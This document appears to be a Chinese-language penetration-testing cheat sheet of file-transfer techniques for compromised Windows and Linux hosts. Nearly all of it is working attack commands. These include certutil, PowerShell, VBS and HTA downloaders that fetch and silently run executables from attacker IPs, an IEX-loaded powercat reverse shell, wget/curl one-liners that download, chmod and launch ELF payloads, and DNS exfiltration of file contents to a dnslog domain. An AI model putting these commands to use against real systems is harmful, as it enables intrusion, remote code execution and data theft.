# 文件传输方法

## Windows文件传输

### Bitsadmin

- 命令行工具，可以创建下载或上传作业，并监视其进度
- [bitsadmin | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/bitsadmin)

```cmd
bitsadmin /transfer shell http://192.168.1.165/test.hta C:\Windows\temp\test.hta
```

- `/transfer`: 用于创建一个新的传输任务
- `shell`: 任务名称，可以任意指定

### Certuil

- `windows` 命令行程序, 主要用于管理、查看、配置证书以及与证书相关的服务。包含多种功能，可以用于证书的导入、导出、列出等操作。

- [certutil | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil)

  ```cmd
  certutil -urlcache -split -f http://192.168.1.165/test.exe C:\windows\temp\test.exe & start C:\windows\temp\test.exe
  ```

- `urlcache`: 这个参数指示`certutil`将url作为缓存来处理，允许`certutil`从url下载文件。

- `split` : 将url的内容分割成多个部分，通常用于大文件下载

- `f` : 强制覆盖

### powershell

1. DownloadFile

   ```cmd
   # 创建一个&nbsp;System.Net.WebClient 对象，并将其存储在变量&nbsp;$d&nbsp;中
   $d = New-Object System.Net.WebClient
   
   # 调用对象的DownloadFile方法下载文件
   $d.DownloadFile("https://pastebin.com/raw/M676F14U","s.txt")
   
   # 使用 powershell -c 来执行一个字符串形式的命令
   powershell -c "$p=new-object system.net.webclient;$p.DownloadFile('https://pastebin.com/raw/M676F14U','s.txt')"
   
   powershell -command "(new-object system.net.webclient).downloadfile('https://pastebin.com/raw/M676F14U','s.txt')"
   
   # 使用 powershell 命令直接执行
   powershell (new-object system.net.webclient).downloadfile('https://pastebin.com/raw/M676F14U','s.txt')
   
   # 远程下载文件到本地执行
   cmd /c powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('http://127.0.0.1:8080/123.exe','notepad.exe');start-process notepad.exe
   ```

2. Invoke-WebRequest

   - `Powershell` 的一个 `cmdlet`, 用于发送http或https请求到指定url

     ```cmd
     powershell Invoke-WebRequest -uri "https://pastebin.com/raw/M676F14U" -OutFile "$env:temp\s.txt"
     ```

3. DownloadString

   - `WebClient` 对象的`DownloadString` 方法，下载指定url的内容作为字符串

     ```cmd
     powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://gitee.com/yijingsec/powercat/raw/master/powercat.ps1');powercat -c 192.168.81.229 -p 1234 -e cmd"
     ```

   - `IEX`: `powershell` 内置命令, 用于立即执行字符串形式的脚本代码

   - `-c`: 指定目标IP

   - `-p`: 指定端口

   - `-e`: 指定执行的命令

### SCP

- `Linux`和`Windows`文件互传

- 下载文件

  ```cmd
  # 下载单个文件
  scp zjudge@192.168.1.165:~/test.hta test.hta
  
  # 下载目录
  scp -r zjudge@192.168.1.165:~/Document document/
  ```

- 上传文件

  ```cmd
  # 单个文件
  scp test.txt root@192.168.81.229:/tmp/test.txt
  
  # 目录
  scp -r password/ root@192.168.81.229:/tmp/pass/
  ```

### net use

- windows 系统命令，将共享资源映射到本地计算机

  ```cmd
  # 显示建立的网络共享连接
  net use
  
  # 与远程主机建立连接，并映射到本地
  net use k: \\192.168.1.165\C$ /user:vagrant "vagrant"
  
  # 列出远程主机C盘目录
  dir \\192.168.1.165\C$
  
  # 下载远程主机文件
  copy \\192.168.81.227\c$\6666.hta c:\6666.hta
  ```

### VBS

- 下载

  ```vbscript
  ' 使用CreateObject()方法创建一个名为xPost的XMLHttpRequest对象，用于向远程服务器发送HTTP请求
  Set xPost=createObject("Microsoft.XMLHTTP")
  ' 调用Open()方法打开一个GET请求，指定要下载的文件的URL地址
  ' 最后一个参数为0表示异步请求，即不等待服务器响应直接执行下一条语句
  xPost.Open "GET","http://192.168.81.229/6666.exe",0
  ' 调用Send()方法发送请求并获取响应内容。
  xPost.Send()
  ' 使用CreateObject()创建一个名为sGet的ADODB.Stream对象，用于将响应内容保存到本地文件
  ' 设置sGet的Mode为3（adModeReadWrite），Type为1（adTypeBinary），表示以二进制方式读写流数据
  ' 然后调用Open()方法打开流，调用Write()方法写入响应内容，最后调用SaveToFile()方法将流数据保存到本地文件中
  set sGet=createObject("ADODB.Stream")
  sGet.Mode=3
  sGet.Type=1
  sGet.Open()
  sGet.Write xPost.ResponseBody
  sGet.SaveToFile "c:\6666.exe",2
  ```

  ```cmd
  cscript download.vbs
  ```

- 下载并执行

  ```vbscript
  Set Post = CreateObject("Msxml2.XMLHTTP")
  Set Shell = CreateObject("Wscript.Shell")
  Post.Open "GET","http://192.168.81.229/6666.exe",0
  Post.Send()
  Set aGet = CreateObject("ADODB.Stream")
  aGet.Mode = 3
  aGet.Type = 1
  aGet.Open()
  aGet.Write(Post.responseBody)
  aGet.SaveToFile "c:\6666.exe",2
  wscript.sleep 1000
  Shell.Run ("c:\6666.exe") '延迟过后执行下载文件
  ```

- cmd命令写入脚本并执行

  ```cmd
  echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs
  echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs
  echo Post.Open "GET","http://192.168.81.229/6666.exe",0 >>zl.vbs
  echo Post.Send() >>zl.vbs
  echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs
  echo aGet.Mode = 3 >>zl.vbs
  echo aGet.Type = 1 >>zl.vbs
  echo aGet.Open() >>zl.vbs
  echo aGet.Write(Post.responseBody) >>zl.vbs
  echo aGet.SaveToFile "c:\6666.exe",2 >>zl.vbs
  echo wscript.sleep 1000 >>zl.vbs
  echo Shell.Run ("c:\6666.exe") >>zl.vbs
  cscript zl.vbs
  ```

- wget.vbs

  ```vbscript
  ' 开启错误处理，当发生错误时跳过并继续执行下一条语句
  on error resume next
  ' 使用"Wscript.Arguments()"获取命令行参数，分别赋值给iLocal、iRemote、iUser和iPass变量。
  ' iLocal表示本地保存文件的路径，
  ' iRemote表示远程文件的URL地址，
  ' iUser和iPass表示访问远程服务器需要的用户名和密码（如果不需要认证，则为空字符串）
  iLocal=LCase(Wscript.Arguments(1))
  iRemote=LCase(Wscript.Arguments(0))
  iUser=LCase(Wscript.Arguments(2))
  iPass=LCase(Wscript.Arguments(3))
  ' 使用CreateObject()创建一个名为xPost的XMLHttpRequest对象，用于向远程服务器发送HTTP请求
  set xPost=CreateObject("Microsoft.XMLHTTP")
  ' 判断是否需要认证，调用Open()方法打开一个GET请求，最后调用Send()方法发送请求并获取响应内容
  if iUser="" and iPass="" then
  xPost.Open "GET",iRemote,0
  else
  xPost.Open "GET",iRemote,0,iUser,iPass
  end if
  xPost.Send()
  ' 使用CreateObject()创建一个名为sGet的ADODB.Stream对象，用于将响应内容保存到本地文件
  ' 设置sGet的Mode为3（adModeReadWrite），Type为1（adTypeBinary），表示以二进制方式读写流数据
  ' 然后调用Open()方法打开流，调用Write()方法写入响应内容，最后调用SaveToFile()方法将流数据保存到本地文件iLocal中
  set sGet=CreateObject("ADODB.Stream")
  sGet.Mode=3
  sGet.Type=1
  sGet.Open()
  sGet.Write xPost.ResponseBody
  sGet.SaveToFile iLocal,2
  ```

  ```cmd
  cscript wget.vbs http://192.168.81.229/6666.exe c:\6666.exe
  ```

### HTA

- 保存为`.hta`文件后运行

```html
<html>
<head>
<script>
// 使用new ActiveXObject()方法创建一个名为Object的MSXML2.XMLHTTP对象，用于向远程服务器发送HTTP请求
// 然后调用Object.open()方法打开一个GET请求，指定要下载的文件的URL地址
// 最后一个参数为false表示同步请求，即等待服务器响应后再执行下一条语句
// 使用Object.send()方法发送请求并获取响应内容
var Object = new ActiveXObject("MSXML2.XMLHTTP");
Object.open("GET","http://192.168.81.229/6666.exe",false);
Object.send();

// 检查Object.Status的值是否等于200，表示HTTP响应的状态码是否为成功。
// 响应成功，就使用new ActiveXObject()方法创建一个名为Stream的ADODB.Stream对象，用于将响应内容保存到本地文件
// 然后调用Stream.Open()方法打开流，调用Stream.Type = 1方法设置流数据类型为二进制
// 调用Stream.Write()方法写入响应内容，最后调用Stream.SaveToFile()方法将流数据保存到本地文件"C:\6666.exe"中
// 使用new ActiveXObject()方法创建一个名为Shell的Wscript.Shell对象，用于运行本地可执行文件
// 调用Shell.Run()方法运行C:\6666.exe文件
// 调用Stream.Close()方法关闭流，调用window.close()方法关闭窗口
if (Object.Status == 200)
{
    var Stream = new ActiveXObject("ADODB.Stream");
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.SaveToFile("C:\\6666.exe", 2);
    Stream.Close();
    var Shell = new ActiveXObject("Wscript.Shell");
    Shell.Run("C:\\6666.exe");
}
window.close();
</script>
<HTA:APPLICATION ID="test" WINDOWSTATE = "minimize">
</head>
<body>
</body>
</html>
```

## Linux文件传输

### wget

```bash
wget http://192.168.81.229/5555.elf -P /tmp/ && chmod +x /tmp/5555.elf && /tmp/5555.elf &
# -P 指定存储路径
# -O 指定保存的文件名
```

### curl

```bash
curl -o 5555.elf http://192.168.81.229/5555.elf && chmod +x 5555.elf && ./5555.elf &

curl -O http://192.168.81.229/5555.elf && chmod +x 5555.elf && ./5555.elf &

# -o 自定义保存的文件名
# -O 使用远程文件名
```

### netcat

```bash
# kali
cat file | nc -lvvp 1234

# linux
nc 192.168.81.229 1234 > 5555.elf

# kali
nc 192.168.81.221 1234 < 5555.elf

# linux
nc -lvvp 1234 > 5555.elf
```

### SFTP

```bash
sftp root@192.168.81.229:/var/www/html/

sftp -P 22 root@192.168.81.229

sftp -P 22 -i ~/.ssh/id_rsa root@192.168.81.229

# -P 指定端口
# -i 指定私钥
```

### DNS

```bash
cat test | xxd -p -c 16 | while read line; do host $line.sau547.dnslog.cn; done
```

## 脚本语言

### PHP

```php
php -r 'file_put_contents("5555.elf",file_get_contents("http://192.168.81.229/5555.elf"));'
```

### Python

```python
python3 -c "import urllib.request;u=urllib.request.urlopen('http://192.168.81.229/5555.elf');f=open('c:\\temp\\win.hta','w');f.write(u.read().decode('utf-8'))"

python2 -c "import urllib2;u=urllib2.urlopen('http://192.168.81.229/5555.elf');f=open('c:\\temp\\win.hta','w');f.write(u.read());f.close()"
```

### Ruby

```ruby
#!ruby
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("192.168.81.229") { |http| r = http.get("/5555.elf")
  open("/tmp/5555.elf", "wb") { |file| file.write(r.body)
    }
}
```

```bash
ruby -e "require 'net/http';Net::HTTP.start('192.168.81.229') { |http|r = http.get('/5555.elf');open('/tmp/5555.elf', 'wb') { |file| file.write(r.body)}}"
```

